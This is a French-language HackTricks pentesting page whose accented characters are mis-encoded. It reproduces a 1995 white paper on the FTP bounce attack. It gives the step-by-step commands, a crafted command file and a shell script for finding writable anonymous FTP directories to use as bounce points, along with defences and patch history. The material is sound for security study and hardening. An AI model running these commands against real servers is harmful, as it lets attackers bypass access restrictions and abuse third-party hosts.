<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une entreprise de cybers√©curit√© ? Voulez-vous voir votre entreprise annonc√©e dans HackTricks ? ou voulez-vous avoir acc√®s √† la derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF ? Consultez les [PLANS D'ABONNEMENT](https://github.com/sponsors/carlospolop) !

- D√©couvrez [La famille PEASS](https://opensea.io/collection/the-peass-family), notre collection d'exclusivit√©s [NFTs](https://opensea.io/collection/the-peass-family)

- Obtenez le [swag officiel PEASS & HackTricks](https://peass.creator-spring.com)

- Rejoignez le [üí¨](https://emojipedia.org/speech-balloon/) groupe Discord ou le groupe Telegram ou suivez-moi sur Twitter [üê¶](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md) [@carlospolopm](https://twitter.com/hacktricks_live).

- Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud).

</details>


# R√©sum√©

Si vous avez acc√®s √† un serveur FTP de rebond, vous pouvez le faire demander des fichiers d'un autre serveur FTP (o√π vous connaissez des identifiants) et t√©l√©charger ce fichier sur votre propre serveur.

## Exigences

Identifiants FTP valides dans le serveur FTP interm√©diaire  
Identifiants FTP valides dans le serveur FTP victime  
Les deux serveurs acceptent la commande PORT (attaque de rebond FTP)  
Vous pouvez √©crire dans un r√©pertoire du serveur FTP interm√©diaire  
Le serveur interm√©diaire aura plus d'acc√®s dans le serveur FTP victime que vous pour une raison quelconque (c'est ce que vous allez exploiter)

## √âtapes

1. Connectez-vous √† votre propre serveur FTP et rendez la connexion passive (commande pasv) pour qu'elle √©coute dans un r√©pertoire o√π le service victime enverra le fichier
2. Faites le fichier qui va envoyer le serveur FTP interm√©diaire au serveur victime (l'exploit). Ce fichier sera un texte simple des commandes n√©cessaires pour s'authentifier contre le serveur victime, changer de r√©pertoire et t√©l√©charger un fichier sur votre propre serveur.
3. Connectez-vous au serveur FTP interm√©diaire et t√©l√©chargez le fichier pr√©c√©dent
4. Faites en sorte que le serveur FTP interm√©diaire √©tablisse une connexion avec le serveur victime et envoie le fichier d'exploitation
5. Capturez le fichier sur votre propre serveur FTP
6. Supprimez le fichier d'exploitation du serveur FTP interm√©diaire

Toutes les informations de ce post ont √©t√© extraites de : [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)

# L'attaque de rebond FTP

Ceci discute l'une des nombreuses utilisations possibles de l' "attaque de rebond de serveur FTP". Le m√©canisme utilis√© est probablement bien connu, mais jusqu'√† pr√©sent, l'int√©r√™t pour le d√©tailler ou le corriger semble faible √† inexistant. Cet exemple particulier d√©montre encore une autre fa√ßon dont la plupart des "restrictions d'exportation" √©lectroniquement appliqu√©es sont compl√®tement inutiles et faciles √† contourner. Il est choisi dans un effort pour faire en sorte que le lecteur se rende compte qu'il y a certains aspects vraiment mal con√ßus du protocole FTP standard.

Merci √©galement √† Alain Knaff chez imag.fr pour une discussion br√®ve mais divertissante de certaines de ces questions il y a quelques mois qui m'a fait r√©fl√©chir plus profond√©ment √† leur sujet.

## La motivation

Vous √™tes un utilisateur sur foreign.fr, adresse IP F.F.F.F, et vous voulez r√©cup√©rer le code source cryptographique de crypto.com aux √âtats-Unis. Le serveur FTP de crypto.com est configur√© pour permettre votre connexion, mais refuser l'acc√®s aux sources cryptographiques parce que votre adresse IP source est celle d'un site non am√©ricain [aussi pr√®s que leur serveur FTP peut le d√©terminer √† partir du DNS, c'est-√†-dire]. En tout cas, vous ne pouvez pas r√©cup√©rer directement ce que vous voulez √† partir du serveur de crypto.com.

Cependant, crypto.com permettra √† ufred.edu de t√©l√©charger des sources cryptographiques parce que ufred.edu est √©galement aux √âtats-Unis. Vous savez que /incoming sur ufred.edu est un r√©pertoire accessible en √©criture dans le monde entier que tout utilisateur anonyme peut d√©poser des fichiers et les lire. L'adresse IP de crypto.com est C.C.C.C.

## L'attaque

Cela suppose que vous avez un serveur FTP qui fait du mode passif. Ouvrez une connexion FTP √† l'adresse IP r√©elle de votre propre machine [pas localhost] et connectez-vous. Changez de r√©pertoire pour un r√©pertoire pratique auquel vous avez acc√®s en √©criture, puis faites :
```text
pasv
stor foobar
```
Prenez note de l'adresse et du port renvoy√©s par la commande PASV, F,F,F,F,X,X. Cette session FTP va maintenant √™tre suspendue, donc mettez-la en arri√®re-plan ou passez √† une autre fen√™tre ou quelque chose pour continuer le reste de la proc√©dure.

Construisez un fichier contenant des commandes de serveur FTP. Appelons ce fichier "`instrs`". Il ressemblera √† ceci:
```text
user ftp
pass -anonymous@
cwd /export-restricted-crypto
type i
port F,F,F,F,X,X
retr crypto.tar.Z
quit
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
...
```
F,F,F,F,X,X repr√©sente la m√™me adresse et le m√™me port que votre propre machine vous a fourni lors de la premi√®re connexion. Les donn√©es inutiles √† la fin sont des lignes suppl√©mentaires que vous cr√©ez, chacune contenant 250 NULLS et rien d'autre, suffisamment pour remplir environ 60 Ko de donn√©es suppl√©mentaires. La raison de ce remplissage sera expliqu√©e plus tard.

Ouvrez une connexion FTP vers ufred.edu, connectez-vous en tant qu'utilisateur anonyme et acc√©dez √† /incoming. Maintenant, tapez ce qui suit dans cette session FTP, qui transf√®re une copie de votre fichier "`instrs`" puis demande au serveur FTP d'ufred.edu de se connecter au serveur FTP de crypto.com en utilisant votre fichier comme commandes :
```text
put instrs
port C,C,C,C,0,21
retr instrs
```
`Crypto.tar.Z` devrait maintenant appara√Ætre comme "`foobar`" sur votre machine via votre premi√®re connexion FTP. Si la connexion √† ufred.edu ne s'est pas interrompue d'elle-m√™me en raison d'un bogue de serveur apparemment courant, nettoyez en supprimant "`instrs`" et en sortant. Sinon, vous devrez vous reconnecter pour terminer.

## Discussion

Il existe plusieurs variantes de cela. Votre connexion de r√©cepteur PASV peut √™tre ouverte sur n'importe quelle machine √† laquelle vous avez acc√®s en √©criture de fichiers - la v√¥tre, une autre connexion √† ufred.edu ou quelque part compl√®tement diff√©rent. En fait, cela n'a m√™me pas besoin d'√™tre un serveur FTP - n'importe quelle utilit√© qui √©coutera sur un port TCP connu et lira des donn√©es brutes √† partir de celui-ci dans un fichier fera l'affaire. Une connexion de donn√©es FTP en mode passif est simplement un moyen pratique de le faire.

Les z√©ros suppl√©mentaires √† la fin du fichier de commande sont l√† pour remplir les fen√™tres TCP des deux c√¥t√©s de la connexion ufred -&gt; crypto, et garantir que la connexion de commande reste ouverte suffisamment longtemps pour que toute la session soit ex√©cut√©e. Sinon, la plupart des serveurs FTP ont tendance √† interrompre tous les transferts et le traitement des commandes lorsque la connexion de contr√¥le se ferme pr√©matur√©ment. La taille des donn√©es est suffisante pour remplir les fen√™tres de r√©ception et de transmission, qui sur certains syst√®mes d'exploitation sont assez grandes \[de l'ordre de 30K\]. Vous pouvez r√©duire cela si vous connaissez les syst√®mes d'exploitation des deux extr√©mit√©s et la somme de leurs tailles de fen√™tre TCP par d√©faut. Il est divis√© en lignes de 250 caract√®res pour √©viter de d√©passer les tampons de commandes sur le serveur cible - probablement acad√©mique puisque vous avez d√©j√† demand√© au serveur de quitter.

Si crypto.com interdit \*toute\* connexion de client FTP de votre part √† foreign.fr et que vous devez voir quels fichiers sont o√π, vous pouvez toujours mettre "`list -aR`" dans votre fichier de commande et obtenir une liste de r√©pertoire de l'arborescence enti√®re via ufred.

Vous devrez peut-√™tre r√©cup√©rer votre fichier de commande sur le serveur FTP cible en mode ASCII plut√¥t qu'en mode binaire. Certains serveurs FTP peuvent traiter les nouvelles lignes brutes, mais d'autres peuvent avoir besoin de lignes de commande termin√©es par des paires CRLF. Gardez cela √† l'esprit lorsque vous r√©cup√©rez des fichiers vers des d√©mons autres que des serveurs FTP.

## Autres possibilit√©s

Malgr√© le fait que de telles connexions tierces ne soient que dans un sens, elles peuvent √™tre utilis√©es pour toutes sortes de choses. Des m√©thodes similaires peuvent √™tre utilis√©es pour poster des courriers et des nouvelles virtuellement non tra√ßables, marteler des serveurs sur divers sites, remplir des disques, essayer de sauter des pare-feu et √™tre g√©n√©ralement ennuyeux et difficiles √† suivre en m√™me temps. Un peu de r√©flexion permettra de r√©aliser de nombreuses autres possibilit√©s effrayantes.

Les connexions lanc√©es de cette mani√®re proviennent du port source 20, que certains sites autorisent √† travers leurs pare-feu dans un effort pour traiter le probl√®me "ftp-data". Pour certains usages, cela peut √™tre la meilleure chose suivante aux attaques √† routage source, et est susceptible de r√©ussir l√† o√π le routage source √©choue contre les filtres de paquets. Et tout cela est rendu possible par la fa√ßon dont la sp√©cification du protocole FTP a √©t√© √©crite, permettant aux connexions de contr√¥le de venir de n'importe o√π et aux connexions de donn√©es d'aller n'importe o√π.

## D√©fenses

Il y aura toujours des sites sur le net avec des serveurs FTP craquel√©s et des r√©pertoires inscriptibles qui permettent ce genre de trafic, donc dire "r√©parez tous les serveurs FTP" est la mauvaise r√©ponse. Mais vous pouvez prot√©ger le v√¥tre contre le fait d'√™tre un point de rebond tiers et contre l'utilisation d'un autre contre vous.

La premi√®re chose √©vidente √† faire est de permettre √† un serveur FTP de ne faire des connexions de donn√©es qu'√† partir de l'h√¥te m√™me d'o√π est originaire la connexion de contr√¥le. Cela n'emp√™che pas l'attaque ci-dessus, bien s√ªr, puisque le r√©cepteur PASV pourrait tout aussi bien √™tre sur ufred.edu et donc r√©pondre √† cette exigence, mais cela emp√™che que votre site soit un point de rebond potentiel. Cela rompt √©galement le concept de "proxy FTP", mais quelque part cach√© dans ce paragraphe se trouve un tr√®s petit violon.

La prochaine chose √©vidente est d'interdire les connexions de contr√¥le FTP qui proviennent de ports r√©serv√©s, ou du moins du port 20. Cela emp√™che le sc√©nario ci-dessus tel qu'il est d√©crit.

Ces deux choses, plus les habituelles b√™tises sur le blocage des paquets √† routage source et d'autres avenues de spoofing, sont n√©cessaires pour emp√™cher les hacks de ce genre. Et r√©fl√©chissez √† la question de savoir si vous avez vraiment besoin d'un r√©pertoire "entrant" ouvert.

Ne permettre que des connexions de donn√©es client en mode passif est une autre possibilit√©, mais il y a encore trop de clients FTP en cours d'utilisation qui ne sont pas conscients du mode passif.

## "Un consensus l√¢che et un code en cours d'ex√©cution"

Il existe des travaux existants qui abordent cela disponibles ici sur avian.org \[et cela fait plusieurs mois, je pourrais ajouter\] dans l'archive "[fixkits](ftp://ftp.avian.org:/src/fixkits/)". Plusieurs mods pour wu-ftpd-2.4 sont pr√©sent√©s, qui incluent du code pour emp√™cher et journaliser les tentatives d'utilisation de commandes PORT bidon. Des correctifs de s√©curit√© r√©cents d'ailleurs sont √©galement inclus, ainsi que la prise en charge de s/key et diverses options de compilation pour renforcer la s√©curit√© pour des applications sp√©cifiques.

Stan Barber chez academ.com travaille √† la fusion de ces correctifs et de plusieurs autres correctifs dans une v√©ritable version mise √† jour de wu-ftpd. Il y a quelques autres efforts divergents en cours. Nulle part il n'est affirm√© que tout ce travail est complet pour le moment, mais c'est un d√©but vers quelque chose que j'ai en t√™te depuis un certain temps - une version de wu-ftpd-2.5 √† l'√©chelle du r√©seau, avec des contributions de partout sur le net. Le serveur wu-ftpd est devenu tr√®s populaire, mais a grand besoin d'une autre mise √† niveau de s√©curit√©. Il serait agr√©able de rassembler toutes les am√©liorations en un seul endroit coordonn√©, et il semble que cela se produira. Tout cela n'aidera toujours pas les personnes qui insistent pour ex√©cuter des serveurs fournis par le fournisseur, bien s√ªr.

La v√©rification de la source du port de connexion du client n'est pas impl√©ment√©e sp√©cifiquement dans les correctifs du serveur FTP, mais dans des modifications du package tcp-wrappers de Wietse, car ce probl√®me est plus g√©n√©ral. Une option PORT simple est ajout√©e qui refuse les connexions √† partir de plages configurables de ports source √† l'√©tape tcpd, avant qu'un d√©mon appel√© ne soit ex√©cut√©.

Certaines de ces modifications sont indiqu√©es dans [/src/fixkits/README](ftp://ftp.avian.org:/src/fixkits/README) dans la zone FTP anonyme ici. Lisez cette feuille de route avant de prendre d'autres choses.

## Notes

Ajouter les z√©ros √† la fin du fichier de commande √©tait la cl√© pour faire fonctionner cela contre une vari√©t√© de d√©mons. L'envoi simplement des donn√©es souhait√©es √©chouerait g√©n√©ralement en raison de la fermeture imm√©diate signalant au d√©mon de se retirer.

Si WUSTL n'a pas abandonn√© compl√®tement le projet wu-ftpd, ils sont tr√®s discrets sur les travaux ult√©rieurs. Bryan O'Connor semble avoir beaucoup d'autres projets √† g√©rer maintenant...

C'est un script trivial pour trouver des r√©pertoires et des fichiers appartenant au monde et appartenant √† FTP sur un serveur FTP anonyme bas√© sur Unix. Vous seriez surpris de voir combien de ces "points de rebond" inscriptibles apparaissent apr√®s une courte ex√©cution de quelque chose comme cela. Vous devrez ensuite v√©rifier que vous pouvez √† la fois mettre et obtenir des fichiers √† partir de tels endroits ; certains serveurs prot√®gent les fichiers t√©l√©charg√©s contre la lecture. Beaucoup ne le font pas, et se demandent ensuite pourquoi ils font partie des dix meilleurs sites de warez de cette semaine...
```text
#!/bin/sh
ftp -n $1 << FOE
quote "user ftp"
quote "pass -nobody@"
prompt
cd /
dir "-aR" xxx.$$
bye
FOE
# Not smart enough to figure out ftp's numeric UID if no passwd file!
cat -v xxx.$$ | awk '
  BEGIN { idir = "/" ; dirp = 0 }
  /.:$/ { idir = $0 ; dirp = 1 ; }
  /^[-d][-r](......w.|........  *[0-9]* ftp  *)/ {
    if (dirp == 1) print idir
    dirp = 0
    print $0
  } '
rm xxx.$$
```
Je suppose qu'on pourrait appeler cela un livre blanc. Il est disponible sur avian.org dans [/random/ftp-attack](ftp://ftp.avian.org:/random/ftp-attack) ainsi que dans divers endroits pertinents. \_H\* 950712



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
